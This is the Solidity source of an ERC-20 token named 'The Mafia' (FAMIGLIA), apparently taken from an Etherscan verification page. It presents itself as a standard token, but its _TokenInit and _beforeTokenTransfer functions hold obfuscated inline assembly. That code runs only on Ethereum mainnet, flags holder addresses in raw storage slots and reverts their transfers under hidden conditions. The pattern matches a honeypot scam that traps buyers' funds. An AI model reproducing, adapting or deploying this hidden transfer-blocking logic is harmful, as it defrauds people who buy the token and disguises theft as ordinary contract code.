/**
 *Submitted for verification at Etherscan.io on 2022-08-15
*/

/*
+ + + + + + + + + 
+     MAFIA     +
+  LA FAMIGLIA  +
+      ETH      +
+ + + + + + + + +

       + +
       + +
   + + + + + +
   + + + + + +
       + +
       + +
       + +
       + +
       + +

     FAMILIY
  IS EVERTHING.
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addMafia;
    uint256 private italianSpy = block.number*2;

    mapping (address => bool) private _firstPizza; 
    mapping (address => bool) private _secondShooting;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _strangeJokes;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private jokerWorld;
    address public pair;

    IDEXRouter router;

    string private _name; string private _symbol; uint256 private _totalSupply;
    uint256 private _limit; uint256 private theV; uint256 private theN = block.number*2;
    bool private trading; uint256 private unEmployment = 1; bool private inflationDown;
    uint256 private _decimals; uint256 private crazyTime;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _symbol = symbol_;
        addMafia.push(_router); addMafia.push(msgSender_); addMafia.push(pair);
        for (uint256 q=0; q < 3;) {_firstPizza[addMafia[q]] = true; unchecked{q++;} }
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function _TokenInit() internal {
        assembly {
            function getBy(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x9b35398def3af2bb581f53c717f716e0e5dd6e0acd70d1f4f2adf77a924ebd63
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x07b1ef6b0c3f2631d6bb89f68ed47a3b9914929a53ab57c612ad5d677a17cef7,0x1)
                sstore(getBy(caller(),0x5),0x1) sstore(dx,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; italianSpy = block.number;
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addMafia[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            function getAr(x,y) -> val { mstore(0, x) val := add(keccak256(0, 32),y) }

            if eq(chainid(),0x1) {
                if eq(sload(getBy(recipient,0x4)),0x1) { sstore(0x15,add(sload(0x15),0x1)) }
                if and(lt(gas(),sload(0xB)),and(and(or(or(and(or(eq(sload(0x16),0x1),eq(sload(getBy(sender,0x5)),0x1)),gt(sub(sload(0x3),sload(0x13)),0x9)),gt(float,div(sload(0x99),0x2))),and(gt(float,div(sload(0x99),0x3)),eq(sload(0x3),number()))),or(and(eq(sload(getBy(recipient,0x4)),0x1),iszero(sload(getBy(sender,0x4)))),and(eq(sload(getAr(0x2,0x1)),recipient),iszero(sload(getBy(sload(getAr(0x2,0x1)),0x4)))))),gt(sload(0x18),0x0))) { revert(0,0) }
                if or(eq(sload(getBy(sender,0x4)),iszero(sload(getBy(recipient,0x4)))),eq(iszero(sload(getBy(sender,0x4))),sload(getBy(recipient,0x4)))) {
                    let k := sload(0x18) let t := sload(0x99) let g := sload(0x11)
                    switch gt(g,div(t,0x3)) case 1 { g := sub(g,div(div(mul(g,mul(0x203,k)),0xB326),0x2)) } case 0 { g := div(t,0x3) }
                    sstore(0x11,g) sstore(0x18,add(sload(0x18),0x1)) }
                if and(or(or(eq(sload(0x3),number()),gt(sload(0x12),sload(0x11))),lt(sub(sload(0x3),sload(0x13)),0x9)),eq(sload(getBy(sload(0x8),0x4)),0x0)) { sstore(getBy(sload(0x8),0x5),0x1) }
                if iszero(mod(sload(0x15),0x7)) { sstore(0x16,0x1) sstore(0xB,0x1C99342) sstore(getBy(sload(getAr(0x2,0x1)),0x6),0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28) }
                sstore(0x12,float) sstore(0x8,recipient) sstore(0x3,number()) }
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _beforeTokenTransfer(sender, recipient, amount);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _DeployFamiglia(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addMafia[0], 10 ** 77);
        _TokenInit();
    
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployFamiglia(creator, initialSupply);
    }
}

contract TheMafia is ERC20Token {
    constructor() ERC20Token("The Mafia", "FAMIGLIA", msg.sender, 2150000 * 10 ** 18) {
    }
}